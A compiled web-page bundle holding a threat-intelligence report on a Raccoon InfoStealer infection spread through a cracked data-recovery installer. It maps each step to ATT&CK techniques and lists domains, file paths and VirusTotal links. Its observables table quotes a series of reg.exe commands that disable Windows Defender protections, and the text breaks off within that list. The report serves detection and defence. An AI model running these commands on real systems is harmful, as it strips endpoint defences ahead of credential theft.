"use strict";(self.webpackChunkac3_threat_sightings=self.webpackChunkac3_threat_sightings||[]).push([[8058],{3248:function(e,t,a){var r=a(7294),n=a(7273);n.Z.initialize({startOnLoad:!0});t.Z=function(e){var t=e.chart;return(0,r.useEffect)((function(){n.Z.contentLoaded()}),[]),r.createElement("div",{className:"mermaid"},t)}},9758:function(e,t,a){a.r(t),a.d(t,{frontMatter:function(){return d},contentTitle:function(){return s},metadata:function(){return c},toc:function(){return m},default:function(){return p}});var r=a(7462),n=a(3366),l=(a(7294),a(4137)),i=a(3248),o=["components"],d={},s=void 0,c={unversionedId:"Sightings/Raccoon_InfoStealer",id:"Sightings/Raccoon_InfoStealer",isDocsHomePage:!1,title:"Raccoon_InfoStealer",description:"Overview",source:"@site/docs/03-Sightings/06-Raccoon_InfoStealer.md",sourceDirName:"03-Sightings",slug:"/Sightings/Raccoon_InfoStealer",permalink:"/ac3-threat-sightings/docs/Sightings/Raccoon_InfoStealer",tags:[],version:"current",sidebarPosition:6,frontMatter:{},sidebar:"tutorialSidebar",previous:{title:"Jupyter_InfoStealer",permalink:"/ac3-threat-sightings/docs/Sightings/Jupyter_InfoStealer"},next:{title:"Guildma_RAT",permalink:"/ac3-threat-sightings/docs/Sightings/Guildma_RAT"}},m=[{value:"Overview",id:"overview",children:[{value:"References:",id:"references",children:[]},{value:"Threat Actor Activity",id:"threat-actor-activity",children:[]},{value:"Count of documented TTPs by Tactic",id:"count-of-documented-ttps-by-tactic",children:[]},{value:"Attack Flow",id:"attack-flow",children:[]}]},{value:"Tactics, Techniques and Procedures",id:"tactics-techniques-and-procedures",children:[]},{value:"Tactics, Techniques, Procedures, Observables and Notes",id:"tactics-techniques-procedures-observables-and-notes",children:[]},{value:"TTP Profiles with Observables",id:"ttp-profiles-with-observables",children:[{value:"Threat actor used Search Engine Optimization (SEO) poisoning to lure users for Initial Access.",id:"threat-actor-used-search-engine-optimization-seo-poisoning-to-lure-users-for-initial-access",children:[]},{value:"Threat actor used compromised installers to lure users for Execution.",id:"threat-actor-used-compromised-installers-to-lure-users-for-execution",children:[]},{value:"Threat actor used <em>Visual Basic scripts</em> to launch a <em>doscmd/batch</em> file via <em>CMD</em> for Execution.",id:"threat-actor-used-visual-basic-scripts-to-launch-a-doscmdbatch-file-via-cmd-for-execution",children:[]},{value:"Threat actor used <em>doscmd/batch</em> files to disable Windows Defender via multiple <em>reg.exe</em> and <em>SCHTASKS.exe</em> for Defense Evasion.",id:"threat-actor-used-doscmdbatch-files-to-disable-windows-defender-via-multiple-regexe-and-schtasksexe-for-defense-evasion",children:[]},{value:"Threat actor used <em>AntiAV</em> (an open source tool obfuscation tool) to obfuscate malware binary file for Defense Evasion.",id:"threat-actor-used-antiav-an-open-source-tool-obfuscation-tool-to-obfuscate-malware-binary-file-for-defense-evasion",children:[]},{value:"Threat actor used <em>CMD</em> to launch Raccoon InfoStealer for Execution.",id:"threat-actor-used-cmd-to-launch-raccoon-infostealer-for-execution",children:[]},{value:"Malware used HTTP to download additional tools for Command And Control.",id:"malware-used-http-to-download-additional-tools-for-command-and-control",children:[]},{value:"Malware used <em>Native APIs</em> to access Chrome credentials store for Credential Access.",id:"malware-used-native-apis-to-access-chrome-credentials-store-for-credential-access",children:[]},{value:"Malware used <em>SQlite3</em> DLL to read Firefox credentials store for Credential Access.",id:"malware-used-sqlite3-dll-to-read-firefox-credentials-store-for-credential-access",children:[]},{value:"Malware used <em>unconfirmed method</em> to create a <em>.zip</em> file for Collection.",id:"malware-used-unconfirmed-method-to-create-a-zip-file-for-collection",children:[]},{value:"Malware used <em>cloud storage</em> for Exfiltration.",id:"malware-used-cloud-storage-for-exfiltration",children:[]},{value:"Malware used <em>CMD delayed command execution</em> to delelete itself for Defense Evasion.",id:"malware-used-cmd-delayed-command-execution-to-delelete-itself-for-defense-evasion",children:[]}]}],u={toc:m};function p(e){var t=e.components,a=(0,n.Z)(e,o);return(0,l.kt)("wrapper",(0,r.Z)({},u,a,{components:t,mdxType:"MDXLayout"}),(0,l.kt)("h2",{id:"overview"},"Overview"),(0,l.kt)("p",null,"This Threat Sighting documents a case of ",(0,l.kt)("em",{parentName:"p"},"Raccoon Stealer")," bundled together with a cracked version of a commercial software tool. In this case, the user accessed a Youtube video that shows how to install and crack a tool called Stellar Data Recovery; download link is included in the description of the video. Likely Search Engine Optimization (SEO) poisoning was used for accelerating distribution. Upon infection, Raccoon accessed Web Browsers credentials stores and exfiltrated data to cloud storage."),(0,l.kt)("p",null,"This document is a summary of the extracted TTPs. For full details please refer to the AC3 Threat Sighting (.yml file) at: ",(0,l.kt)("a",{parentName:"p",href:"https://github.com/mcafee-enterprise/ac3-threat-sightings/blob/main/sightings/Sightings_Raccoon_InfoStealer.yml"},"https://github.com/mcafee-enterprise/ac3-threat-sightings/blob/main/sightings/Sightings_Raccoon_InfoStealer.yml")),(0,l.kt)("p",null,"Author: Alejandro Houspanossian (@lekz86)"),(0,l.kt)("p",null,"Acknowledgements: Alejandro Houspanossian (@lekz86)"),(0,l.kt)("h3",{id:"references"},"References:"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},(0,l.kt)("a",{parentName:"li",href:"https://malpedia.caad.fkie.fraunhofer.de/details/win.raccoon"},"https://malpedia.caad.fkie.fraunhofer.de/details/win.raccoon")),(0,l.kt)("li",{parentName:"ul"},(0,l.kt)("a",{parentName:"li",href:"https://www.sentinelone.com/labs/info-stealers-how-malware-hacks-private-user-data/"},"https://www.sentinelone.com/labs/info-stealers-how-malware-hacks-private-user-data/")),(0,l.kt)("li",{parentName:"ul"},(0,l.kt)("a",{parentName:"li",href:"https://apr4h.github.io/2019-12-20-Harvesting-Browser-Credentials/"},"https://apr4h.github.io/2019-12-20-Harvesting-Browser-Credentials/")),(0,l.kt)("li",{parentName:"ul"},(0,l.kt)("a",{parentName:"li",href:"https://renenyffenegger.ch/notes/development/web/browser/Firefox/profile-folder/index"},"https://renenyffenegger.ch/notes/development/web/browser/Firefox/profile-folder/index")),(0,l.kt)("li",{parentName:"ul"},(0,l.kt)("a",{parentName:"li",href:"https://blogs.blackberry.com/en/2021/09/threat-thursday-raccoon-infostealer"},"https://blogs.blackberry.com/en/2021/09/threat-thursday-raccoon-infostealer")),(0,l.kt)("li",{parentName:"ul"},(0,l.kt)("a",{parentName:"li",href:"https://news.sophos.com/en-us/2021/08/03/trash-panda-as-a-service-raccoon-stealer-steals-cookies-cryptocoins-and-more/"},"https://news.sophos.com/en-us/2021/08/03/trash-panda-as-a-service-raccoon-stealer-steals-cookies-cryptocoins-and-more/"))),(0,l.kt)("h3",{id:"threat-actor-activity"},"Threat Actor Activity"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"Threat actor used Search Engine Optimization (SEO) poisoning to lure users for Initial Access."),(0,l.kt)("li",{parentName:"ul"},"Threat actor used compromised installers to lure users for Execution."),(0,l.kt)("li",{parentName:"ul"},"Threat actor used ",(0,l.kt)("em",{parentName:"li"},"Visual Basic scripts")," to launch a ",(0,l.kt)("em",{parentName:"li"},"doscmd/batch")," file via ",(0,l.kt)("em",{parentName:"li"},"CMD")," for Execution."),(0,l.kt)("li",{parentName:"ul"},"Threat actor used ",(0,l.kt)("em",{parentName:"li"},"doscmd/batch")," files to disable Windows Defender via multiple ",(0,l.kt)("em",{parentName:"li"},"reg.exe")," and ",(0,l.kt)("em",{parentName:"li"},"SCHTASKS.exe")," for Defense Evasion."),(0,l.kt)("li",{parentName:"ul"},"Threat actor used ",(0,l.kt)("em",{parentName:"li"},"AntiAV")," (an open source tool obfuscation tool) to obfuscate malware binary file for Defense Evasion."),(0,l.kt)("li",{parentName:"ul"},"Threat actor used ",(0,l.kt)("em",{parentName:"li"},"CMD")," to launch Raccoon InfoStealer for Execution."),(0,l.kt)("li",{parentName:"ul"},"Malware used HTTP to download additional tools for Command And Control."),(0,l.kt)("li",{parentName:"ul"},"Malware used ",(0,l.kt)("em",{parentName:"li"},"Native APIs")," to access Chrome credentials store for Credential Access."),(0,l.kt)("li",{parentName:"ul"},"Malware used ",(0,l.kt)("em",{parentName:"li"},"SQlite3")," DLL to read Firefox credentials store for Credential Access."),(0,l.kt)("li",{parentName:"ul"},"Malware used ",(0,l.kt)("em",{parentName:"li"},"unconfirmed method")," to create a ",(0,l.kt)("em",{parentName:"li"},".zip")," file for Collection."),(0,l.kt)("li",{parentName:"ul"},"Malware used ",(0,l.kt)("em",{parentName:"li"},"cloud storage")," for Exfiltration."),(0,l.kt)("li",{parentName:"ul"},"Malware used ",(0,l.kt)("em",{parentName:"li"},"CMD delayed command execution")," to delelete itself for Defense Evasion.")),(0,l.kt)("h3",{id:"count-of-documented-ttps-by-tactic"},"Count of documented TTPs by Tactic"),(0,l.kt)("table",null,(0,l.kt)("thead",{parentName:"table"},(0,l.kt)("tr",{parentName:"thead"},(0,l.kt)("th",{parentName:"tr",align:null},"Tactic"),(0,l.kt)("th",{parentName:"tr",align:null},"# Documented TTPs"))),(0,l.kt)("tbody",{parentName:"table"},(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Initial Access"),(0,l.kt)("td",{parentName:"tr",align:null},"+ (1)")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Command And Control"),(0,l.kt)("td",{parentName:"tr",align:null},"+ (1)")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Collection"),(0,l.kt)("td",{parentName:"tr",align:null},"+ (1)")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Exfiltration"),(0,l.kt)("td",{parentName:"tr",align:null},"+ (1)")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Credential Access"),(0,l.kt)("td",{parentName:"tr",align:null},"++ (2)")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Execution"),(0,l.kt)("td",{parentName:"tr",align:null},"+++ (3)")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Defense Evasion"),(0,l.kt)("td",{parentName:"tr",align:null},"+++ (3)")))),(0,l.kt)("h3",{id:"attack-flow"},"Attack Flow"),(0,l.kt)("p",null,"The chart below shows a graphical representation of the attack flow."),(0,l.kt)(i.Z,{chart:"\ngraph LR\nIA[Initial Access] --\x3e | Search Engine Optimization -SEO- poisoning to lure users| IA[Initial Access]\nIA[Initial Access] --\x3e | compromised installers to lure users| EXE[Execution]\nEXE[Execution] --\x3e | _Visual Basic scripts_ to launch a _doscmd/batch_ file via _CMD_| EXE[Execution]\nEXE[Execution] --\x3e | _doscmd/batch_ files to disable Windows Defender via multiple _reg.exe_ and _SCHTASKS.exe_| DE[Defense Evasion]\nDE[Defense Evasion] --\x3e | _AntiAV_ -an open source tool obfuscation tool- to obfuscate malware binary file| DE[Defense Evasion]\nDE[Defense Evasion] --\x3e | _CMD_ to launch Raccoon InfoStealer| EXE[Execution]\nEXE[Execution] --\x3e | HTTP to download additional tools| C2[Command And Control]\nEXE[Execution] --\x3e | _Native APIs_ to access Chrome credentials store| CA[Credential Access]\nCA[Credential Access] --\x3e | _SQlite3_ DLL to read Firefox credentials store| CA[Credential Access]\nCA[Credential Access] --\x3e | _unconfirmed method_ to create a _.zip_ file| COL[Collection]\nCOL[Collection] --\x3e | _cloud storage_| EXFIL[Exfiltration]\nEXE[Execution] --\x3e | _CMD delayed command execution_ to delelete itself| DE[Defense Evasion]\n",mdxType:"Mermaid"}),(0,l.kt)("h2",{id:"tactics-techniques-and-procedures"},"Tactics, Techniques and Procedures"),(0,l.kt)("table",null,(0,l.kt)("thead",{parentName:"table"},(0,l.kt)("tr",{parentName:"thead"},(0,l.kt)("th",{parentName:"tr",align:null},"Tactic"),(0,l.kt)("th",{parentName:"tr",align:null},"Techniques"),(0,l.kt)("th",{parentName:"tr",align:null},"Procedure"))),(0,l.kt)("tbody",{parentName:"table"},(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Initial Access"),(0,l.kt)("td",{parentName:"tr",align:null},"T1189 - Drive-by Compromise",(0,l.kt)("br",null),"T1105 - Ingress Tool Transfer"),(0,l.kt)("td",{parentName:"tr",align:null},"Threat actor used Search Engine Optimization (SEO) poisoning to lure users for Initial Access.")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Execution"),(0,l.kt)("td",{parentName:"tr",align:null},"T1204.002 - User Execution: Malicious File"),(0,l.kt)("td",{parentName:"tr",align:null},"Threat actor used compromised installers to lure users for Execution.")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Execution"),(0,l.kt)("td",{parentName:"tr",align:null},"T1059.005 - Command and Scripting Interpreter: Visual Basic",(0,l.kt)("br",null),"T1059.003 - Command and Scripting Interpreter: Windows Command Shell"),(0,l.kt)("td",{parentName:"tr",align:null},"Threat actor used ",(0,l.kt)("em",{parentName:"td"},"Visual Basic scripts")," to launch a ",(0,l.kt)("em",{parentName:"td"},"doscmd/batch")," file via ",(0,l.kt)("em",{parentName:"td"},"CMD")," for Execution.")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Defense Evasion"),(0,l.kt)("td",{parentName:"tr",align:null},"T1562.001 - Impair Defenses: Disable or Modify Tools",(0,l.kt)("br",null),"T1112 - Modify Registry"),(0,l.kt)("td",{parentName:"tr",align:null},"Threat actor used ",(0,l.kt)("em",{parentName:"td"},"doscmd/batch")," files to disable Windows Defender via multiple ",(0,l.kt)("em",{parentName:"td"},"reg.exe")," and ",(0,l.kt)("em",{parentName:"td"},"SCHTASKS.exe")," for Defense Evasion.")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Defense Evasion"),(0,l.kt)("td",{parentName:"tr",align:null},"T1140 - Deobfuscate/Decode Files or Information",(0,l.kt)("br",null),"T1059.003 - Command and Scripting Interpreter: Windows Command Shell"),(0,l.kt)("td",{parentName:"tr",align:null},"Threat actor used ",(0,l.kt)("em",{parentName:"td"},"AntiAV")," (an open source tool obfuscation tool) to obfuscate malware binary file for Defense Evasion.")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Execution"),(0,l.kt)("td",{parentName:"tr",align:null},"T1059.003 - Command and Scripting Interpreter: Windows Command Shell"),(0,l.kt)("td",{parentName:"tr",align:null},"Threat actor used ",(0,l.kt)("em",{parentName:"td"},"CMD")," to launch Raccoon InfoStealer for Execution.")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Command And Control"),(0,l.kt)("td",{parentName:"tr",align:null},"T1071.001 - Application Layer Protocol: Web Protocols",(0,l.kt)("br",null),"T1105 - Ingress Tool Transfer"),(0,l.kt)("td",{parentName:"tr",align:null},"Malware used HTTP to download additional tools for Command And Control.")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Credential Access"),(0,l.kt)("td",{parentName:"tr",align:null},"T1555.003 - Credentials from Password Stores: Credentials from Web Browsers",(0,l.kt)("br",null),"T1106 - Native API"),(0,l.kt)("td",{parentName:"tr",align:null},"Malware used ",(0,l.kt)("em",{parentName:"td"},"Native APIs")," to access Chrome credentials store for Credential Access.")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Credential Access"),(0,l.kt)("td",{parentName:"tr",align:null},"T1555.003 - Credentials from Password Stores: Credentials from Web Browsers"),(0,l.kt)("td",{parentName:"tr",align:null},"Malware used ",(0,l.kt)("em",{parentName:"td"},"SQlite3")," DLL to read Firefox credentials store for Credential Access.")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Collection"),(0,l.kt)("td",{parentName:"tr",align:null},"T1560 - Archive Collected Data"),(0,l.kt)("td",{parentName:"tr",align:null},"Malware used ",(0,l.kt)("em",{parentName:"td"},"unconfirmed method")," to create a ",(0,l.kt)("em",{parentName:"td"},".zip")," file for Collection.")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Exfiltration"),(0,l.kt)("td",{parentName:"tr",align:null},"T1567.002 - Exfiltration Over Web Service: Exfiltration to Cloud Storage"),(0,l.kt)("td",{parentName:"tr",align:null},"Malware used ",(0,l.kt)("em",{parentName:"td"},"cloud storage")," for Exfiltration.")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Defense Evasion"),(0,l.kt)("td",{parentName:"tr",align:null},"T1070.004 - Indicator Removal on Host: File Deletion",(0,l.kt)("br",null),"T1059 - Command and Scripting Interpreter: Windows Command Shell"),(0,l.kt)("td",{parentName:"tr",align:null},"Malware used ",(0,l.kt)("em",{parentName:"td"},"CMD delayed command execution")," to delelete itself for Defense Evasion.")))),(0,l.kt)("h2",{id:"tactics-techniques-procedures-observables-and-notes"},"Tactics, Techniques, Procedures, Observables and Notes"),(0,l.kt)("table",null,(0,l.kt)("thead",{parentName:"table"},(0,l.kt)("tr",{parentName:"thead"},(0,l.kt)("th",{parentName:"tr",align:null},"Tactic"),(0,l.kt)("th",{parentName:"tr",align:null},"Techniques"),(0,l.kt)("th",{parentName:"tr",align:null},"Procedure"),(0,l.kt)("th",{parentName:"tr",align:null},"Observables"),(0,l.kt)("th",{parentName:"tr",align:null},"Notes"))),(0,l.kt)("tbody",{parentName:"table"},(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Initial Access"),(0,l.kt)("td",{parentName:"tr",align:null},"T1189",(0,l.kt)("br",null),"T1105"),(0,l.kt)("td",{parentName:"tr",align:null},"Threat actor used Search Engine Optimization (SEO) poisoning to lure users for Initial Access."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"DNS Queried"),": ",(0,l.kt)("inlineCode",{parentName:"td"},"softwarebestever[.]fun"),(0,l.kt)("br",null),(0,l.kt)("em",{parentName:"td"},"DNS Queried"),": ",(0,l.kt)("inlineCode",{parentName:"td"},"youtub[.]space"),(0,l.kt)("br",null),(0,l.kt)("em",{parentName:"td"},"File Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\Users\\\\#{user}\\\\Downloads\\\\StellarDataRecoveryProfessional.rar")),(0,l.kt)("td",{parentName:"tr",align:null},"- Search Engine Optimization (SEO) poisoning allows threat actors to rank their malicious resources higher in web searches.",(0,l.kt)("br",null),"- In this case, apparently, the user is searching for a cracked version of a tool called Stellar Data Recovery.",(0,l.kt)("br",null),"- softwarebestever","[.]","fun resolves to an IP address that corresponds to the Russian Federation",(0,l.kt)("br",null),"- There is osint that shows that softwarebestever","[.]","fun has served the file ",(0,l.kt)("em",{parentName:"td"},"StellarDataRecoveryProfessional.rar")," at some point in time (https://urlscan","[.]","io/search/#page.domain%3Asoftwarebestever.fun)",(0,l.kt)("br",null),"- Youtube video (",(0,l.kt)("a",{parentName:"td",href:"https://www.youtube.com/watch?v=GJW-PN_O4z8"},"https://www.youtube.com/watch?v=GJW-PN_O4z8"),") shows how to download and crack Stellar Data Recovery Professional.",(0,l.kt)("br",null),"- youtub","[.]","space is part of the url provided in the description of the video (",(0,l.kt)("a",{parentName:"td",href:"https://www.youtube%5B.%5Dcom/redirect?event=video_description&redir_token=QUFFLUhqbEFBNzdjUXNuQklzWkdBSHFSYm1VN2Y0RkxDZ3xBQ3Jtc0tsN1NnVE5RODhvRlJ1cTlHamhBeG0tdFZhVFNFSG1SR2ZrS1ktWk9FMGlKQlZ5U0hJM2RKN05WWWN6TDFzWEliZ3cxU1JiYUZIVlVGb05NN0p0U2tGUC1ISVJvRlpVZlBzVU53aGxsZDRFbW9pQi1fdw&q=https%3A%2F%2Fyoutub%5B%5D.%5Dspace%2FStellarDataRecoveryProfessional"},"https://www.youtube[.]com/redirect?event=video_description&redir_token=QUFFLUhqbEFBNzdjUXNuQklzWkdBSHFSYm1VN2Y0RkxDZ3xBQ3Jtc0tsN1NnVE5RODhvRlJ1cTlHamhBeG0tdFZhVFNFSG1SR2ZrS1ktWk9FMGlKQlZ5U0hJM2RKN05WWWN6TDFzWEliZ3cxU1JiYUZIVlVGb05NN0p0U2tGUC1ISVJvRlpVZlBzVU53aGxsZDRFbW9pQi1fdw&q=https%3A%2F%2Fyoutub[].]space%2FStellarDataRecoveryProfessional"),")",(0,l.kt)("br",null),"- Unknown if user was maliciously redirected to perform this download",(0,l.kt)("br",null),"- StellarDataRecoveryProfessional.rar seems to be a cracked copy of Stellar Data Recovery Professional.",(0,l.kt)("br",null),"- StellarDataRecoveryProfessional.rar file has no reputation at VT (Oct 2nd 2021)")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Execution"),(0,l.kt)("td",{parentName:"tr",align:null},"T1204.002"),(0,l.kt)("td",{parentName:"tr",align:null},"Threat actor used compromised installers to lure users for Execution."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'"C:\\\\Program Files (x86)\\\\IZArc\\\\IZArc.exe\\" -ef C:\\\\Users\\\\#{user}\\\\Downloads C:\\\\Users\\\\#{user}\\\\Downloads\\\\StellarDataRecoveryProfessional.rar'),(0,l.kt)("br",null),(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\Users\\\\#{user}\\\\Downloads\\\\StellarDataRecoveryProfessional\\\\StellarDataRecoveryProfessional\\\\StellarDataRecovery-Professional.exe"),(0,l.kt)("br",null),(0,l.kt)("em",{parentName:"td"},"File Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\ProgramData\\\\IgHMwb34dcD\\\\7z.exe"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\ProgramData\\\\IgHMwb34dcD\\\\main.bat"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\ProgramData\\\\IgHMwb34dcD\\\\STRTbbbn7przuvwav4hbpbps.vbs"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\ProgramData\\\\IgHMwb34dcD\\\\DELbbbn7l3bnchd166d2hhhv.bat"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\ProgramData\\\\IgHMwb34dcD\\\\AVDbbbn7i3b4ho55ck6raahj.bat")),(0,l.kt)("td",{parentName:"tr",align:null},"- As parent process is Explorer, likely the user executed  the process.",(0,l.kt)("br",null),"- IZArc.exe seems to be legit archiving functionality",(0,l.kt)("br",null),"- StellarDataRecovery-Professional.exe seems to be a fake or compromissed installer.",(0,l.kt)("br",null),"- ",(0,l.kt)("a",{parentName:"td",href:"https://www.virustotal.com/gui/file/56783c2e395603404c92bc44ca0c39d4bbcc312edbf6d2349e367c232c5b8e57"},"https://www.virustotal.com/gui/file/56783c2e395603404c92bc44ca0c39d4bbcc312edbf6d2349e367c232c5b8e57"),(0,l.kt)("br",null),"- 13/69 detections at VT (Oct 2nd 2021)",(0,l.kt)("br",null),"- main.bat is related to ",(0,l.kt)("a",{parentName:"td",href:"https://github.com/hXR16F/AntiAV/blob/master/AntiAV.bat"},"https://github.com/hXR16F/AntiAV/blob/master/AntiAV.bat"),", and Anti AntiVirus project.",(0,l.kt)("br",null),"- AntiAV obfuscates files using compression via 7zip")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Execution"),(0,l.kt)("td",{parentName:"tr",align:null},"T1059.005",(0,l.kt)("br",null),"T1059.003"),(0,l.kt)("td",{parentName:"tr",align:null},"Threat actor used ",(0,l.kt)("em",{parentName:"td"},"Visual Basic scripts")," to launch a ",(0,l.kt)("em",{parentName:"td"},"doscmd/batch")," file via ",(0,l.kt)("em",{parentName:"td"},"CMD")," for Execution."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'"C:\\\\Windows\\\\System32\\\\WScript.exe\\" \\"C:\\\\ProgramData\\\\IgHMwb34dcD\\\\STRTbbbn7przuvwav4hbpbps.vbs\\"'),(0,l.kt)("br",null),(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'C:\\\\Windows\\\\system32\\\\cmd.exe /c \\"\\"C:\\\\ProgramData\\\\IgHMwb34dcD\\\\AVDbbbn7i3b4ho55ck6raahj.bat\\" \\"')),(0,l.kt)("td",{parentName:"tr",align:null},"- Script available at VT ",(0,l.kt)("a",{parentName:"td",href:"https://www.virustotal.com/gui/file/91ce5c5b2e5b19258d79f4da4dc087058a67c657f586c6c17cb5bef93070479e/content"},"https://www.virustotal.com/gui/file/91ce5c5b2e5b19258d79f4da4dc087058a67c657f586c6c17cb5bef93070479e/content"),(0,l.kt)("br",null),"- detection rate 2/58 (Oct 2nd 2021)",(0,l.kt)("br",null),"- Script available at VT ",(0,l.kt)("a",{parentName:"td",href:"https://www.virustotal.com/gui/file/684985d417bc480cc3da17a8bd2a081ccb67a2c3315ce18abcb7c7b8ea5f8d58"},"https://www.virustotal.com/gui/file/684985d417bc480cc3da17a8bd2a081ccb67a2c3315ce18abcb7c7b8ea5f8d58"),(0,l.kt)("br",null),"- detection rate 6/57 (Oct 2nd 2021)")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Defense Evasion"),(0,l.kt)("td",{parentName:"tr",align:null},"T1562.001",(0,l.kt)("br",null),"T1112"),(0,l.kt)("td",{parentName:"tr",align:null},"Threat actor used ",(0,l.kt)("em",{parentName:"td"},"doscmd/batch")," files to disable Windows Defender via multiple ",(0,l.kt)("em",{parentName:"td"},"reg.exe")," and ",(0,l.kt)("em",{parentName:"td"},"SCHTASKS.exe")," for Defense Evasion."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'reg  add \\"HKLM\\\\Software\\\\Microsoft\\\\Windows Defender\\\\Features\\" /v \\"TamperProtection\\" /t REG_DWORD /d \\"0\\" /f'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'reg  delete \\"HKLM\\\\Software\\\\Policies\\\\Microsoft\\\\Windows Defender\\" /f'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'reg  add \\"HKLM\\\\Software\\\\Policies\\\\Microsoft\\\\Windows Defender\\" /v \\"DisableAntiSpyware\\" /t REG_DWORD /d \\"1\\" /f'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'reg  add \\"HKLM\\\\Software\\\\Policies\\\\Microsoft\\\\Windows Defender\\" /v \\"DisableAntiVirus\\" /t REG_DWORD /d \\"1\\" /f'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'reg  add \\"HKLM\\\\Software\\\\Policies\\\\Microsoft\\\\Windows Defender\\\\MpEngine\\" /v \\"MpEnablePus\\" /t REG_DWORD /d \\"0\\" /f'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'reg  add \\"HKLM\\\\Software\\\\Policies\\\\Microsoft\\\\Windows Defender\\\\Real-Time Protection\\" /v \\"DisableBehaviorMonitoring\\" /t REG_DWORD /d \\"1\\" /f'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'reg  add \\"HKLM\\\\Software\\\\Policies\\\\Microsoft\\\\Windows Defender\\\\Real-Time Protection\\" /v \\"DisableIOAVProtection\\" /t REG_DWORD /d \\"1\\" /f'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'reg  add \\"HKLM\\\\Software\\\\Policies\\\\Microsoft\\\\Windows Defender\\\\Real-Time Protection\\" /v \\"DisableOnAccessProtection\\" /t REG_DWORD /d \\"1\\" /f'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'reg  add \\"HKLM\\\\Software\\\\Policies\\\\Microsoft\\\\Windows Defender\\\\Real-Time Protection\\" /v \\"DisableRealtimeMonitoring\\" /t REG_DWORD /d \\"1\\" /f'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'reg  add \\"HKLM\\\\Software\\\\Policies\\\\Microsoft\\\\Windows Defender\\\\Real-Time Protection\\" /v \\"DisableScanOnRealtimeEnable\\" /t REG_DWORD /d \\"1\\" /f'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'reg  add \\"HKLM\\\\Software\\\\Policies\\\\Microsoft\\\\Windows Defender\\\\Reporting\\" /v \\"DisableEnhancedNotifications\\" /t REG_DWORD /d \\"1\\" /f'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'reg  add \\"HKLM\\\\Software\\\\Policies\\\\Microsoft\\\\Windows Defender\\\\SpyNet\\" /v \\"DisableBlockAtFirstSeen\\" /t REG_DWORD /d \\"1\\" 